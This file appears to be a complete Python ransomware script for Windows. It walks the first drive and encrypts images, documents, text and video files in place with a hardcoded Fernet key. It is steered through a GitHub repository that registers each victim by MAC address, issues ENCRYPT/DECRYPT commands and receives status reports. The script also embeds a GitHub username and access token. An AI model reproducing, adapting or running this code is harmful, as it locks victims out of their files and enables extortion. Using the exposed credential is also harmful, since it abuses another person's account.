import os
from cryptography import fernet
from cryptography.fernet import Fernet
from binascii import Error
import string
from ctypes import windll
from glob import glob
from github import Github
from uuid import getnode as get_mac
from os import path 

k="bImD4glbqcfVl7EyyTVJxqc6N_bdu6UR_yDte2tqerU="
global tDirs
global tFiles

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def release_issue():
    g = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
    repo=g.get_user().get_repo("UPDATE1")    
    mac = get_mac()
    repo.create_file(str(mac)+".txt", "FILE_CREATED", "")


def fileInRepo(repo, path_to_file):
    dir_path = os.path.dirname(path_to_file)
    rsub = repo.head.commit.tree
    path_elements = dir_path.split(os.path.sep)
    for el_id, element in enumerate(path_elements):
        sub_path = os.path.join(*path_elements[:el_id + 1])
        if sub_path in rsub:
            rsub = rsub[element]
        else:
            return False
    return path_to_file in rsub

def git_up(msg,content):
    g = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
    repo=g.get_user().get_repo("UPDATE1")
    mac=get_mac()
    file = repo.get_contents(str(mac)+".txt")
    repo.update_file(str(mac)+".txt", msg, content, file.sha)


def get_hub():
    github = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
    user = github.get_user()
    repository = user.get_repo("UPDATE1")
    mac= get_mac()
    file_content = repository.get_contents(str(mac)+".txt")
    chek = file_content.decoded_content.decode()
    return chek

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    return drives

def scan_d(APP_FOLDER):
    tDirs=0
    tFiles=0
    for base, dirs, files in os.walk(APP_FOLDER):
        print('Searching in : ',base)
        for directories in dirs:
            tDirs += 1
        for Files in files:
            tFiles += 1
            if Files.endswith(('.png','.jpg','.txt','.mp4','.jpeg','.pdf','.docx')):
                try:
                    os.chdir(base)
                    decrypt(os.path.abspath(Files),k)
                except(fernet.InvalidToken, TypeError, Error):
                    print("Skipping IT")

def scan_e(APP_FOLDER):
    tDirs=0
    tFiles=0
    for base, dirs, files in os.walk(APP_FOLDER):
        print('Searching in : ',base)
        for directories in dirs:
            tDirs+=1
        for Files in files:
            tFiles+=1
            if Files.endswith(('.png','.jpg','.txt','.mp4','.jpeg','.pdf','.docx')):
                try:
                    os.chdir(base)
                    encrypt(os.path.abspath(Files),k)
                except(fernet.InvalidToken, TypeError, Error):
                    print("Skipping IT")
            
if __name__ == '__main__':
    lis = get_drives() 
    try:
        data=get_hub()
    except:
        release_issue()
        data=get_hub()
        pass
    if data == " ":
        git_up("NEW_ENTRY","NULL")
    elif "ENCRYPT" in data:
        scan_e(str(lis[0])+":\\")
        git_up("SUCCESSFULL","FULLY_ENCRYPTED")
    elif "DECRYPT" in data:
        scan_d(str(lis[0])+":\\")
        git_up("SUCCESSFULL","FULLY_DECRYPTED")
    





